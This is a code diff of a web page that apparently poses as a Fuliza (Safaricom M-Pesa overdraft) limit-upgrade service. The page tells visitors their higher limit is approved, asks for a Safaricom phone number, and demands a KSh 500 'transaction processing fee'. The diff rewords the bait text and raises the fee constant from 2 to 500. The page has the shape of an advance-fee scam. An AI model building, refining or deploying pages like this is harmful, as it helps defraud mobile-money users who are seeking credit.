@@ -75,13 +75,13 @@ margin:auto;
 <h2>Transaction Processing Fee</h2>
 
 <p class="encourage">
-Dear Customer, your Fuliza limit has already been approved.  
+Dear Customer, your Fuliza limit has been approved.  
 To complete the upgrade process, kindly pay the **transaction processing fee** below.  
 This allows our system to finalize the upgrade and automatically refresh your current limit to the new limit you selected.
 </p>
 
-<div class="info">Selected Limit: <strong id="limit"></strong></div>
-<div class="info">Transaction Fee: <strong>KSh 500</strong></div>
+<div class="info">Selected Fuliza Limit: <strong id="limit"></strong></div>
+<div class="info">Transaction Fee of: <strong>KSh 500</strong></div>
 
 <input type="tel" id="phone" placeholder="Enter Safaricom Number (07XXXXXXXX / 01XXXXXXXX / 2547XXXXXXXX)">
 
@@ -105,7 +105,7 @@ Failure to complete the transaction may delay the update of your Fuliza limit.
 const selectedAmount = localStorage.getItem("selectedAmount");
 document.getElementById("limit").innerText = "KSh " + selectedAmount;
 
-const transactionFee = 2;
+const transactionFee = 500;
 
 function isSafaricom(number){
 return /^(07|01)[0-9]{8}$/.test(number) || /^2547[0-9]{8}$/.test(number);
